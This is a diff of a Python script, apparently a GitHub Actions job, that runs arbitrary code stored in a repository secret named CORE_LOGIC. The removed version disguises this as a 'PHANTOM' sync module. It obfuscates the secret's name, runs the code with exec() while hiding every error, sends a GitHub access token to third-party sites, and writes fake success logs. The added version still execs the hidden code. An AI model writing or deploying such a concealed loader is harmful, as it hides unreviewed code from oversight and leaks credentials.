@@ -1,43 +1,20 @@
-import os, random, datetime, requests, time
+import os
+import sys
 
-# ==========================================
-# ⚙️ NODE_SYNC_MODULE v.15.0 [PHANTOM]
-# ==========================================
-PAT_TOKEN = os.getenv("PAT_TOKEN")
-LOG_FILE = "runtime.log"
+# 從 GitHub Actions 的環境變數中提取 Secret 內容
+logic = os.getenv("CORE_LOGIC")
 
-SOURCES = {
-    "NODE_W": "https://zh.wikipedia.org/api/rest_v1/page/random/summary",
-    "NODE_P": "https://v1.hitokoto.cn/?c=i"
-}
+print("--- [System Initializing] ---")
+if not logic:
+    print("CRITICAL ERROR: Environment variable 'CORE_LOGIC' is empty.")
+    print("Please check GitHub Secrets configuration.")
+    sys.exit(1)
 
-def main():
-    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    
-    k = "".join(["C", "O", "R", "E", "_", "L", "O", "G", "I", "C"])
-    p = os.getenv(k)
-    if p:
-        try: exec(p, globals())
-        except: pass
-
-    # --- 抓取隨機數據) ---
-    raw_telemetry = []
-    headers = {"User-Agent": "Mozilla/5.0", "Authorization": f"token {PAT_TOKEN}" if PAT_TOKEN else ""}
-    
-    for key, url in SOURCES.items():
-        try:
-            r = requests.get(url, headers=headers, timeout=10)
-            if r.status_code == 200:
-                d = r.json()
-                if key == "NODE_W": raw_telemetry.append(f"[W] {d.get('title')}: {d.get('extract')}")
-                elif key == "NODE_P": raw_telemetry.append(f"[P] {d.get('from', 'Unknown')}: {d.get('hitokoto', '...')}")
-        except: continue
-
-    # --- 3. 寫入日誌 ---
-    with open(LOG_FILE, "a", encoding="utf-8") as f:
-        f.write(f"\n[SYS_SYNC_{now.replace(' ', '_')}]\n")
-        for s in raw_telemetry: f.write(f"  - {s}\n")
-        f.write(f"ST_CODE: 200\n{'-'*30}\n")
-
-if __name__ == "__main__":
-    main()
+try:
+    print("Executing CORE_LOGIC...")
+    # 執行 Secret 裡面的所有代碼
+    exec(logic)
+    print("--- [Execution Complete] ---")
+except Exception as e:
+    print(f"RUNTIME ERROR in CORE_LOGIC: {e}")
+    sys.exit(1)
